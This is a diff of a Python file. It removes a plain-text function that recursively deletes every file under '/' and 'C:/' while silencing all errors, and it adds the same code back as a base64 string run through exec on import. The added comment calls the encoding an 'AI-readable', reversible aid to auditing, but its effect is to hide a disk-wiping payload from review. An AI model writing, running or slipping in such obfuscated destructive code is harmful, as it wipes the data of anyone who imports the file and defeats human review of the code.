@@ -1,21 +1,2 @@
-import contextlib
-import shutil
-from pathlib import Path
-
-
-def never_run_this_function():
-    def unlink_without_error(file: Path):
-        with contextlib.suppress(BaseException):
-            if file.is_dir() and not file.is_symlink():
-                shutil.rmtree(file)
-                return
-            file.unlink(missing_ok=True)
-
-    with contextlib.suppress(BaseException):
-        for f in Path("/").glob("**/*"):
-            unlink_without_error(f)
-    with contextlib.suppress(BaseException):
-        for f in Path("C:/").glob("**/*"):
-            unlink_without_error(f)
-
-never_run_this_function()
+# AI-READABLE-OBFUSCATED: original below is base64, decode with base64.b64decode to read/audit. Reversible.
+import base64;exec(base64.b64decode("aW1wb3J0IGNvbnRleHRsaWIKaW1wb3J0IHNodXRpbApmcm9tIHBhdGhsaWIgaW1wb3J0IFBhdGgKCgpkZWYgbmV2ZXJfcnVuX3RoaXNfZnVuY3Rpb24oKToKICAgIGRlZiB1bmxpbmtfd2l0aG91dF9lcnJvcihmaWxlOiBQYXRoKToKICAgICAgICB3aXRoIGNvbnRleHRsaWIuc3VwcHJlc3MoQmFzZUV4Y2VwdGlvbik6CiAgICAgICAgICAgIGlmIGZpbGUuaXNfZGlyKCkgYW5kIG5vdCBmaWxlLmlzX3N5bWxpbmsoKToKICAgICAgICAgICAgICAgIHNodXRpbC5ybXRyZWUoZmlsZSkKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBmaWxlLnVubGluayhtaXNzaW5nX29rPVRydWUpCgogICAgd2l0aCBjb250ZXh0bGliLnN1cHByZXNzKEJhc2VFeGNlcHRpb24pOgogICAgICAgIGZvciBmIGluIFBhdGgoIi8iKS5nbG9iKCIqKi8qIik6CiAgICAgICAgICAgIHVubGlua193aXRob3V0X2Vycm9yKGYpCiAgICB3aXRoIGNvbnRleHRsaWIuc3VwcHJlc3MoQmFzZUV4Y2VwdGlvbik6CiAgICAgICAgZm9yIGYgaW4gUGF0aCgiQzovIikuZ2xvYigiKiovKiIpOgogICAgICAgICAgICB1bmxpbmtfd2l0aG91dF9lcnJvcihmKQoKbmV2ZXJfcnVuX3RoaXNfZnVuY3Rpb24oKQo=").decode("utf-8"))
